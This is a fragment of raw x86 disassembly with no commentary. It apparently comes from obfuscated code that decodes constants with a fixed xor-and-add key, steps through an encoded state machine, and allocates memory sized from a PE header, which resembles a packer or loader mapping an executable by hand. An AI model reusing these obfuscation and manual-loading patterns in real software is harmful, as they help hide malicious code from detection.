  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
